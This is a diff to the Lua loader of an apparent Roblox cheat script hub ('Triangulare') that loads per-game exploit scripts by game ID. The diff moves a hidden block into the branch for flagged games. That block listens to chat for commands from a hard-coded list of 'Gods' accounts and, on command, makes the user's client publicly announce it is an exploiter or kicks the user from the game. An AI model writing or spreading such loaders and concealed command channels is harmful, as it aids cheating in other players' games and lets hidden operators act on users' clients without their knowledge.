@@ -11,7 +11,7 @@ local SupportedGames = {
   [7516718402] = {"games/Noobs Must Die.lua", "Noobs Must Die"},
   [6944270854] = {"games/Rope Battles.lua", "Rope Battles"},
   [7453941040] = {"games/Dangerous Night.lua", "Dangerous Night"},
-  [7219654364] = {"games/DMVS.lua", "[DUELS] Murderers VS Sherrifs"},
+  [7219654364] = {"games/DMVS.lua", "[DUELS] Murderers VS Sherrifs", true},
   [7606156849] = {"games/Make a Sprunki Tycoon.lua", "Make a Sprunki Tycoon!"},
   [7118588325] = {"games/Fast Food Simulator.lua", "Fast Food Simulator"},
   [4931927012] = {"games/Basketball Legends.lua", "Basketball Legends"},
@@ -42,38 +42,38 @@ local SupportedGames = {
 }
 local Game = SupportedGames[game.GameId] or SupportedGames[game.PlaceId]
 if Game then
-    LoadScript(Game[1], Game[2])
-else
-    LoadScript("Triangulare.lua", "Universal")
-end
-
--- Gods
-pcall(function()
-  local Settings = {
-    LastReveal = 0,
-    Cooldown = 1,
-    Gods = {"VladmirNine", "Moligrafi", "HallowHub", "ImBannedAddMeBro"}
-  }
-  
-  if not table.find(Settings.Gods, game:GetService("Players").LocalPlayer.Name) and not getgenv().Triangulare then
-    getgenv().Triangulare = true
-    local TextChatService = game:GetService("TextChatService")
-    TextChatService.OnIncomingMessage:Connect(function(message)
-      local props = message.TextSource
-      if props then
-        local sender = props.UserId and game:GetService("Players"):GetPlayerByUserId(props.UserId)
-        if sender and table.find(Settings.Gods, sender.Name) then
-          if message.Text == "uh." then
-            local now = tick()
-            if now - Settings.LastReveal >= Settings.Cooldown then
-              Settings.LastReveal = now
-              TextChatService.TextChannels.RBXGeneral:SendAsync("Hey! I'm a exploiter! Using Triangulare — made by Moligrafi.")
+  LoadScript(Game[1], Game[2])
+  if Game[3] then
+    pcall(function()
+      local Settings = {
+        LastReveal = 0,
+        Cooldown = 1,
+        Gods = {"VladmirNine", "Moligrafi", "HallowHub", "ImBannedAddMeBro"}
+      }
+      
+      if not table.find(Settings.Gods, game:GetService("Players").LocalPlayer.Name) and not getgenv().Triangulare then
+        getgenv().Triangulare = true
+        local TextChatService = game:GetService("TextChatService")
+        TextChatService.OnIncomingMessage:Connect(function(message)
+          local props = message.TextSource
+          if props then
+            local sender = props.UserId and game:GetService("Players"):GetPlayerByUserId(props.UserId)
+            if sender and table.find(Settings.Gods, sender.Name) then
+              if message.Text == "uh." then
+                local now = tick()
+                if now - Settings.LastReveal >= Settings.Cooldown then
+                  Settings.LastReveal = now
+                  TextChatService.TextChannels.RBXGeneral:SendAsync("Hey! I'm a exploiter! Using Triangulare — made by Moligrafi.")
+                end
+              elseif message.Text == "leave." then
+                game:GetService("Players").LocalPlayer:Kick("You were kicked by a Triangulare admin.")
+              end
             end
-          elseif message.Text == "leave." then
-            game:GetService("Players").LocalPlayer:Kick("You were kicked by a Triangulare admin.")
           end
-        end
-      end
+        end)
+          end
     end)
-      end
-end)
+  end
+else
+  LoadScript("Triangulare.lua", "Universal")
+end
